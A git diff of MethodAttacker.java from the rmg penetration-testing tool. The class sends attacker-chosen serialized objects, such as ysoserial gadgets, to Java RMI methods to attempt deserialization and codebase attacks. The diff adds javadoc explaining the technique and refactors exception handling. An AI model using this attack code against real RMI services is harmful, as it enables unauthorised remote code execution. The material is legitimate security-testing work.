@@ -15,11 +15,22 @@ import java.util.Map.Entry;
 import de.qtc.rmg.internal.ExceptionHandler;
 import de.qtc.rmg.internal.MethodCandidate;
 import de.qtc.rmg.io.Logger;
+import de.qtc.rmg.networking.RMIWhisperer;
 import de.qtc.rmg.utils.RMGUtils;
-import de.qtc.rmg.utils.RMIWhisperer;
 import javassist.CannotCompileException;
 import javassist.NotFoundException;
 
+/**
+ * The method attacker is used to invoke RMI methods on the application level with user controlled
+ * objects as method arguments. It can be used to attempt codebase and deserialization attacks on
+ * known remote methods. Usually, you use first the *guess* operation to enumerate remote methods and
+ * then you use the *method* operation to check them for codebase and deserialization vulnerabilities.
+ *
+ * The MethodAttacker was one of the first operation classes in rmg and is therefore not fully optimized
+ * to the currently available other utility classes. It may be restructured in future.
+ *
+ * @author Tobias Neitzel (@qtc_de)
+ */
 public class MethodAttacker {
 
     private RMIWhisperer rmi;
@@ -29,6 +40,17 @@ public class MethodAttacker {
     private Field proxyField;
     private Field remoteField;
 
+    /**
+     * The MethodAttacker makes use of the official RMI api to obtain the RemoteObject from the RMI registry.
+     * Afterwards, it needs access to the underlying UnicastRemoteRef to perform customized RMi calls. Depending
+     * on the RMI version of the server (current proxy approach or legacy stub objects), this requires access to
+     * a different field within the Proxy or RemoteObject class. Both fields are made accessible within the constructor
+     * to make the actual attacking code more clean.
+     *
+     * @param rmiRegistry registry to perform lookup operations
+     * @param classes list of unknown classes per bound name
+     * @param targetMethod the remote method to target
+     */
     public MethodAttacker(RMIWhisperer rmiRegistry, HashMap<String,String> classes, MethodCandidate targetMethod)
     {
         this.rmi = rmiRegistry;
@@ -42,16 +64,52 @@ public class MethodAttacker {
             remoteField.setAccessible(true);
 
         } catch(NoSuchFieldException | SecurityException e) {
-            Logger.eprintlnMixedYellow("Unexpected Exception caught during", "MethodAttacker", "instantiation.");
-            RMGUtils.stackTrace(e);
-            RMGUtils.exit();
+            ExceptionHandler.unexpectedException(e, "MethodAttacker", "instantiation", true);
         }
     }
 
-    @SuppressWarnings({ "rawtypes", "deprecation" })
+    /**
+     * This lengthy method performs the actual method call. If no bound name was specified, it iterates
+     * over all available bound names on the registry. After some initialization, the function checks the
+     * specified MethodCandidate for non primitive arguments and determines whether the remote endpoint
+     * uses legacy stubs. Non primitive arguments are required for codebase and deserialization attacks,
+     * whereas the legacy status of the server is required to decide whether to create the remote classes
+     * as interface or stub classes on the client side. Within legacy RMI, stub classes are required on the
+     * client side, but current RMI implementations only need an interface that is assigned to a Proxy.
+     *
+     * Depending on the determined legacy status, an interface or legacy stub class is now created dynamically.
+     * With the corresponding class now available on the class path, the RemoteObject can be looked up on the
+     * registry. From the obtained object, the RemoteRef is then extracted by using reflection. With this remote
+     * reference, a customized RMI call can now be dispatched.
+     *
+     * This low level RMI access is required to call methods with invalid argument types. During deserialization
+     * attacks you may want to call a method that expects a HashMap with some other serialized object. When using
+     * ordinary RMI to make the call, Java would refuse to use anything other than a HashMap during the call, as
+     * it would violate the interface definition. With low level RMI access, the call arguments can be manually
+     * written to the stream which allows to use arbitrary arguments for the call.
+     *
+     * @param gadget object to use during the RMI call. Usually a payload object created by ysoserial
+     * @param boundName optional bound name to target. If null, target all bound names
+     * @param argumentPosition specify the argument position to attack. If negative, automatically search for non primitive
+     * @param operationMode the function was upgraded to support two operations 'codebase' or 'attack'
+     * @param legacyMode whether to enforce legacy stubs. 0 -> auto, 1 -> enforce legacy, 2 -> enforce normal
+     */
+    @SuppressWarnings({"rawtypes"})
     public void attack(Object gadget, String boundName, int argumentPosition, String operationMode, int legacyMode)
     {
-        Logger.printlnMixedYellow("Attacking signature", this.targetMethod.getSignature(), "(" + operationMode + " attack)");
+        String methodName = "";
+        boolean isCodebaseCall = operationMode.equals("codebase");
+
+        try {
+            methodName = this.targetMethod.getName();
+        } catch (CannotCompileException | NotFoundException e) {
+            ExceptionHandler.unexpectedException(e, "compliation", "process", true);
+        }
+
+        if(isCodebaseCall)
+            Logger.printCodebaseAttackIntro("RMI", methodName, gadget.getClass().getName());
+        else
+            Logger.printGadgetCallIntro("RMI");
 
         if( boundName != null )
             Logger.printlnMixedBlue("Target name specified. Only attacking bound name:", boundName);
@@ -78,9 +136,7 @@ public class MethodAttacker {
             try {
                 attackArgument = this.targetMethod.getPrimitive(argumentPosition);
             } catch (CannotCompileException | NotFoundException e) {
-                Logger.eprintlnMixedYellow("Caught unexpected", e.getClass().getName(), "while searching for primitives.");
-                RMGUtils.stackTrace(e);
-                RMGUtils.exit();
+                ExceptionHandler.unexpectedException(e, "search", "for primitive types", true);
             }
 
             if( attackArgument == -1 ) {
@@ -106,10 +162,8 @@ public class MethodAttacker {
                 else
                     remoteClass = RMGUtils.makeLegacyStub(className, this.targetMethod);
 
-            } catch(CannotCompileException e) {
-                Logger.eprintlnMixedYellow("Caught", "CannotCompileException", "during interface creation.");
-                Logger.eprintlnMixedYellow("Exception message:", e.getMessage());
-                RMGUtils.showStackTrace(e);
+            } catch(Exception e) {
+                ExceptionHandler.unexpectedException(e, "interface", "creation", false);
                 Logger.decreaseIndent();
                 continue;
             }
@@ -126,9 +180,7 @@ public class MethodAttacker {
                 }
 
             } catch( Exception e ) {
-                Logger.eprintlnMixedYellow("Error: Unable to get instance for", name);
-                Logger.eprintlnMixedYellow("The following exception was caught:", e.getMessage());
-                RMGUtils.showStackTrace(e);
+                ExceptionHandler.unexpectedException(e, "lookup", "call", false);
                 Logger.decreaseIndent();
                 continue;
             }
@@ -144,24 +196,8 @@ public class MethodAttacker {
                 Class randomClass = RMGUtils.makeRandomClass();
                 randomInstance = randomClass.newInstance();
 
-            } catch (CannotCompileException e) {
-                Logger.eprintlnMixedYellow("Caught", "CannotCompileException", "during random class creation.");
-                Logger.eprintlnMixedYellow("Exception message:", e.getMessage());
-                RMGUtils.showStackTrace(e);
-                Logger.decreaseIndent();
-                continue;
-
-            } catch (InstantiationException | IllegalAccessException e) {
-                Logger.eprintlnMixedYellow("Caught", "InstantiationException", "during random class creation.");
-                Logger.eprintlnMixedYellow("Exception message:", e.getMessage());
-                RMGUtils.showStackTrace(e);
-                Logger.decreaseIndent();
-                continue;
-
-            } catch (NotFoundException e) {
-                Logger.eprintlnMixedYellow("Caught", "NotFoundException", "during random class creation.");
-                Logger.eprintlnMixedYellow("Exception message:", e.getMessage());
-                RMGUtils.showStackTrace(e);
+            } catch (Exception e) {
+                ExceptionHandler.unexpectedException(e, "random class", "creation", false);
                 Logger.decreaseIndent();
                 continue;
             }
@@ -174,17 +210,18 @@ public class MethodAttacker {
                 Logger.println("Invoking remote method...");
                 Logger.println("");
                 Logger.increaseIndent();
-                remoteRef.invoke(instance, attackMethod, methodArguments, this.targetMethod.getHash());
+
+                rmi.genericCall(null, -1, this.targetMethod.getHash(), methodArguments, isCodebaseCall, methodName, remoteRef);
 
                 Logger.eprintln("Remote method invocation didn't cause any exception.");
                 Logger.eprintln("This is unusual and the attack probably didn't work.");
 
             } catch (java.rmi.ServerException e) {
 
-                Throwable cause = RMGUtils.getCause(e);
+                Throwable cause = ExceptionHandler.getCause(e);
                 if( cause instanceof java.rmi.UnmarshalException ) {
                     Logger.eprintlnMixedYellow("Method", this.targetMethod.getSignature(), "does not exist on this bound name.");
-                    RMGUtils.showStackTrace(e);
+                    ExceptionHandler.showStackTrace(e);
                     continue;
 
                 } else if( cause instanceof java.lang.ClassNotFoundException ) {
@@ -242,12 +279,12 @@ public class MethodAttacker {
 
             } catch( java.rmi.UnmarshalException e ) {
 
-                Throwable t = RMGUtils.getCause(e);
+                Throwable t = ExceptionHandler.getCause(e);
                 if( t instanceof java.lang.ClassNotFoundException ) {
                     Logger.eprintlnMixedYellow("Caught local", "ClassNotFoundException", "during " + operationMode + " attack.");
                     Logger.eprintlnMixedBlue("This usually occurs when the", "gadget caused an exception", "on the server side.");
                     Logger.printlnMixedYellow("You probably entered entered an", "invalid command", "for the gadget.");
-                    RMGUtils.showStackTrace(e);
+                    ExceptionHandler.showStackTrace(e);
 
                 } else {
                     ExceptionHandler.unexpectedException(e, operationMode, "attack", false);
